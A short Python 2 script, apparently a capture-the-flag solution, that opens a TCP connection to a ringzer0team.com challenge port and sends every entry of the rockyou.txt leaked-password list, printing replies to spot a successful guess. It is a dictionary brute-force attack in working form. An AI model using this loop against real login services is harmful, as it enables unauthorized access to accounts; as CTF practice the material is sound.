import sys
from socket import *              # portable socket interface plus constants

serverHost = 'ringzer0team.com'          # server name, or: 'starship.python.net'
serverPort = 60000                # non-reserved port used by the server
sockobj = socket(AF_INET, SOCK_STREAM)      # make a TCP/IP socket object
sockobj.connect((serverHost, serverPort))   # connect to server machine + port

words = [word for word in open('rockyou.txt')]
for word in words:
    sockobj.send(word)                      # send line to server over socket
    data = sockobj.recv(1024)               # receive line from server: up to 1k
    print data + word,len(word)
    if 'Password' not in data:
    	print data
    	
sockobj.close()                             # close socket to send eof to server
